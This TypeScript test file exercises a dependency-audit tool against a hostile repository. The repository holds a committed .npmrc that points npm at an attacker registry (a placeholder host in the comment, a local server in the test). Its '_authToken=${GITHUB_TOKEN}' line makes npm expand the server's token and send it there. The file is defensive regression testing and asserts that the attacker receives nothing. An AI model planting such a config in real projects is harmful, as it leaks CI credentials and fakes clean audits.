/**
 * `deps_audit` called directly on a hostile repository, with the real npm
 * (gated on its binary, so a skip reports as a skip).
 *
 * Measured on npm 11.20.0 (Windows) before the fix: `npm audit` ran in the
 * project, so npm read the repository's `.npmrc` —
 *
 *     registry=http://<attacker>/
 *     //<attacker>/:_authToken=${GITHUB_TOKEN}
 *
 * — expanded `${GITHUB_TOKEN}` from the server's whole environment, and
 * POSTed the project's dependency list to the attacker's
 * `/-/npm/v1/security/advisories/bulk` with `Authorization: Bearer <the
 * token>`; the attacker's `{}` then read as a clean audit (exit 0). The
 * user's own registry (`~/.npmrc`, here `NPM_CONFIG_USERCONFIG`, which a
 * project's `.npmrc` outranks) was never asked.
 *
 * Two local HTTP servers stand in for the attacker's registry and the user's
 * own; each records every request's path and `Authorization` header and
 * answers the bulk advisory endpoint with `{}` (no advisories). The user's
 * own `~/.npmrc` points at theirs with its own `${NPM_TOKEN}`: that token
 * must still reach it, and only it.
 */

import { randomUUID } from 'node:crypto';
import { createServer } from 'node:http';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import type { PluginContext } from '../../src/context.js';
import { GuardianDatabase as Database } from '../../src/storage/db.js';
import { runMigrations } from '../../src/storage/migrations/runner.js';
import { Storage } from '../../src/storage/index.js';
import { TOOLS } from '../../src/tools/index.js';
import { resetScannerCache } from '../../src/tools/scanHelpers.js';
import type { ToolRun } from '../../src/types.js';
import { cleanupTempDirs, makeTempDir } from '../helpers/tempDir.js';
import { isInstalled } from '../helpers/toolchain.js';

const NPM = await isInstalled('npm');
const TIMEOUT_MS = 240_000;
const SERVER_TOKEN = `ghp_${randomUUID().replace(/-/g, '')}`;
const USER_TOKEN = `npm_${randomUUID().replace(/-/g, '')}`;

interface Seen {
  url: string;
  authorization: string | undefined;
}

async function registry(): Promise<{ port: number; seen: Seen[]; close(): Promise<void> }> {
  const seen: Seen[] = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url ?? '', authorization: req.headers.authorization });
    req.resume();
    const advisories = (req.url ?? '').includes('/security/');
    res.writeHead(advisories ? 200 : 404, { 'content-type': 'application/json' });
    res.end(advisories ? '{}' : '{"error":"not found"}');
  });
  await new Promise<void>((done) => server.listen(0, '127.0.0.1', done));
  const address = server.address();
  return {
    port: typeof address === 'object' && address !== null ? address.port : 0,
    seen,
    close: () => new Promise<void>((done) => server.close(() => done())),
  };
}

let attacker: Awaited<ReturnType<typeof registry>>;
let own: Awaited<ReturnType<typeof registry>>;

beforeAll(async () => {
  await import('../../src/tools/depsAudit.js');
  resetScannerCache();
  attacker = await registry();
  own = await registry();
});

afterEach(() => {
  vi.unstubAllEnvs();
});

afterAll(async () => {
  await attacker.close();
  await own.close();
  cleanupTempDirs();
});

function makePlugin(projectPath: string): PluginContext {
  const db = new Database(':memory:');
  runMigrations(db);
  return { storage: new Storage(db), shell: null, scriptsDir: projectPath, progressNotifier: { send: () => {} } };
}

const LOCK = {
  name: 'x',
  version: '1.0.0',
  lockfileVersion: 3,
  requires: true,
  packages: {
    '': { name: 'x', version: '1.0.0', dependencies: { 'dg-leftpad': '1.0.0' } },
    'node_modules/dg-leftpad': { version: '1.0.0', resolved: 'https://registry.npmjs.org/dg-leftpad/-/dg-leftpad-1.0.0.tgz' },
  },
};

describe('deps_audit on a hostile repository (real npm, gated)', () => {
  it.skipIf(!NPM)(
    "a committed .npmrc's registry gets neither the audit nor the server's token; the user's own registry answers",
    async () => {
      const home = makeTempDir('hostile-audit-home-');
      const userNpmrc = join(home, '.npmrc');
      writeFileSync(userNpmrc, `registry=http://127.0.0.1:${own.port}/\n//127.0.0.1:${own.port}/:_authToken=\${NPM_TOKEN}\n`);
      vi.stubEnv('GITHUB_TOKEN', SERVER_TOKEN);
      vi.stubEnv('NPM_TOKEN', USER_TOKEN);
      vi.stubEnv('NPM_CONFIG_USERCONFIG', userNpmrc);
      vi.stubEnv('npm_config_cache', join(home, 'npm-cache'));

      const project = makeTempDir('hostile-audit-');
      writeFileSync(join(project, 'package.json'), JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { 'dg-leftpad': '1.0.0' } }));
      writeFileSync(join(project, 'package-lock.json'), JSON.stringify(LOCK));
      writeFileSync(
        join(project, '.npmrc'),
        `registry=http://127.0.0.1:${attacker.port}/\n//127.0.0.1:${attacker.port}/:_authToken=\${GITHUB_TOKEN}\n`,
      );

      const tool = TOOLS.find((t) => t.name === 'deps_audit');
      if (tool === undefined) throw new Error('deps_audit not registered');
      const r = await tool.handler({ project_path: project, force: true }, makePlugin(project));
      if (!r.ok) throw new Error(JSON.stringify(r.error));
      const out = r as unknown as { tools_run: ToolRun[]; package_config_not_read?: string[] };

      expect(attacker.seen).toEqual([]);
      const audits = own.seen.filter((s) => s.url.includes('/security/'));
      expect(audits.length).toBeGreaterThan(0);
      expect(audits.every((s) => s.authorization === `Bearer ${USER_TOKEN}`)).toBe(true);
      expect(own.seen.some((s) => (s.authorization ?? '').includes(SERVER_TOKEN))).toBe(false);

      const npm = out.tools_run.find((t) => t.name === 'npm');
      expect(npm?.status).toBe('ok');
      expect(npm?.honoured_config).toBeUndefined();
      expect(out.package_config_not_read).toEqual(['.npmrc']);
    },
    TIMEOUT_MS,
  );
});
